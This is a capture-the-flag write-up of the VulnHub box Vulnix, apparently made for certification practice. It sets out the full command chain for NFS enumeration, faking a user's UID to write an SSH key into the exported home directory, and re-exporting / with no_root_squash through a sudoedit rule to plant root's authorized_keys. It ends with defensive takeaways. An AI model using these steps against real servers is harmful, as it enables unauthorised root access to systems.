Vulnix is an Easy Linux box from **VulnHub** (part of a self-hosted VulnHub lab I'm running to prep for the eJPTv2), and it's a clean, end-to-end lesson in **NFS misconfiguration**. An exported home directory with `root_squash` is reachable by anyone — but since NFS trusts the client's numeric UID, creating a local user with the matching UID grants access, enough to plant an SSH key and log in as `vulnix`. From there a single `sudoedit /etc/exports` rule lets us re-export the *whole filesystem* with `no_root_squash`, mount it as local root, and write `root`'s own `authorized_keys` for a root shell.

## Reconnaissance & Enumeration

### Port Scan

```bash
sudo nmap -p- -sCV 192.168.57.3 -oN nmap
```

```bash
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux)
25/tcp    open  smtp       Postfix smtpd
79/tcp    open  finger     Linux fingerd
110/tcp   open  pop3       Dovecot pop3d
111/tcp   open  rpcbind    2-4 (RPC #100000)
143/tcp   open  imap       Dovecot imapd
512/tcp   open  exec       netkit-rsh rexecd
513/tcp   open  login
514/tcp   open  shell      Netkit rshd
2049/tcp  open  nfs        2-4 (RPC #100003)
```

A wide, old-school service list — a mail stack (SMTP/POP3/IMAP), `finger`, the legacy r-services (`rexec`/`rlogin`/`rsh`), and the piece that matters: **`rpcbind` (111)** with **`nfs` (2049)**. An exposed NFS server is the first thing to enumerate, because its whole security model rests on trusting the client.

### Enumerating NFS

NFS announces what it shares via the mount daemon. Both `nmap`'s NFS scripts and the dedicated `showmount` tool report the same single export:

```bash
nmap -p111,2049 -sV --script "rpcinfo,nfs-showmount,nfs-ls,nfs-statfs" 192.168.57.3
showmount -e 192.168.57.3
```

```bash
Export list for 192.168.57.3:
/home/vulnix *
```

**`/home/vulnix`** is exported to `*` — every host on the network can mount it. That's the way in.

## Initial Access — NFS Share & SSH Key as `vulnix`

### Mounting the export and the UID problem

Mounting the share is straightforward (forcing NFSv3 keeps this old server happy):

```bash
sudo mkdir /mnt/nfs_mount
sudo mount -t nfs -o vers=3 192.168.57.3:/home/vulnix /mnt/nfs_mount
ls -l /mnt
# drwxr-x--- 2 2008 2008 4096 Sep  2  2012 nfs_mount
```

The mount succeeds, but the directory is owned by **UID 2008** with mode `0750`, and our local `root` can't read it. This is `root_squash` doing its job — it maps the client's `root` to the unprivileged `nobody`, so being root locally buys nothing. But here's the key insight about NFS: **permissions are enforced by numeric UID, and the server trusts whatever UID the client presents**. There is no real authentication. So if we become a *local* user whose UID is 2008, the server will treat us as the owner:

```bash
sudo useradd -u 2008 vulnix
sudo su vulnix
$ cd /mnt/nfs_mount && ls -la
# .bash_logout  .bashrc  .profile   (vulnix's home, now fully ours)
```

### Planting an SSH key

Because we now control `vulnix`'s home directory over NFS, we can drop our own key into `~/.ssh/authorized_keys` and log in over SSH. One wrinkle: the server runs **OpenSSH 5.9** (from 2012), which predates Ed25519, so an `ed25519` key is rejected — generating an **RSA** key instead fixes it:

```bash
ssh-keygen -t rsa -b 2048 -f ~/.ssh/vulnix_rsa -N ""
```

```bash
# as the UID-2008 user, write the public key into vulnix's home on the mount
$ mkdir -p /mnt/nfs_mount/.ssh && chmod 700 /mnt/nfs_mount/.ssh
$ echo "ssh-rsa AAAA...<vulnix_rsa.pub>... kali" > /mnt/nfs_mount/.ssh/authorized_keys
$ chmod 600 /mnt/nfs_mount/.ssh/authorized_keys
```

Logging in needs the legacy algorithm flags (modern SSH clients disable `ssh-rsa` by default, and this server only speaks the old ones):

```bash
ssh -i ~/.ssh/vulnix_rsa \
    -o PubkeyAcceptedKeyTypes=+ssh-rsa \
    -o HostKeyAlgorithms=+ssh-rsa \
    vulnix@192.168.57.3
```

```bash
vulnix@vulnix:~$ whoami
vulnix
```

A real shell as **`vulnix`**.

## Privilege Escalation — `vulnix` → `root` (NFS `no_root_squash` via `sudoedit`)

### The sudo rule

```bash
vulnix@vulnix:~$ sudo -l
```

```bash
User vulnix may run the following commands on this host:
    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
```

`vulnix` can edit **`/etc/exports`** — the NFS export table — as root, with no password. `sudoedit` safely opens the file as root in our editor, and `/etc/exports` is the one file that controls how NFS treats remote clients. The current entry is the restrictive one we already met:

```bash
vulnix@vulnix:~$ cat /etc/exports
/home/vulnix	*(rw,root_squash)
```

### Turning off root_squash on `/`

The escalation is to add a *new* export — the entire root filesystem — with **`no_root_squash`**. That option is the opposite of what we hit earlier: it tells the server to *trust* a remote client's `root` as the real `root`. Adding this line with `sudoedit /etc/exports`:

```text
/		*(rw,no_root_squash)
```

> NFS only re-reads `/etc/exports` when the service reloads. Without root we can't run `exportfs -ra`, so this lab is applied by **restarting the VM** (fine for a local VulnHub box; on a real target you'd need the service to reload another way).

After the reload, the new export is visible, and now mounting `/` makes us the real `root` on every file we touch:

```bash
showmount -e 192.168.57.3
# /            *
# /home/vulnix *
sudo mount -t nfs -o vers=3 192.168.57.3:/ /mnt/root
```

### Writing root's authorized_keys

With `no_root_squash`, our local `root` writes to the target's filesystem *as* `root` — so we drop the same RSA key into `root`'s `authorized_keys` and SSH straight in:

```bash
sudo mkdir -p /mnt/root/root/.ssh
sudo cp ~/.ssh/vulnix_rsa.pub /mnt/root/root/.ssh/authorized_keys
ssh -i ~/.ssh/vulnix_rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa root@192.168.57.3
```

```bash
root@vulnix:~# id
uid=0(root) gid=0(root) groups=0(root)
root@vulnix:~# cat /root/trophy.txt
REDACTED
```

Full root, and the trophy.

## Key Takeaways

- **NFS trusts the client's UID — that's the whole threat model.** `root_squash` only neutralises a remote *root*; it does nothing against a client that simply creates a local user with the matching UID (2008 here). Export directories only to specific, trusted hosts, and never assume `root_squash` is access control.
- **`no_root_squash` is remote root by design.** Exporting a filesystem with `no_root_squash` lets any client's root write files as the server's root — dropping an `authorized_keys`, a SUID binary or a cron job is trivial. It should essentially never be used on anything an untrusted host can reach, least of all `/`.
- **A single writable config file can be the whole privesc.** `sudoedit /etc/exports` looked narrow, but `/etc/exports` governs the trust boundary of a root-level service. Audit *what a sudo-editable file controls*, not just whether the rule "looks safe".
- **Old crypto shapes the attack.** OpenSSH 5.9 rejecting Ed25519 and needing `+ssh-rsa` is a reminder to match your tooling to the target's era — the exploit was fine; the key type and algorithm flags were the actual blockers.
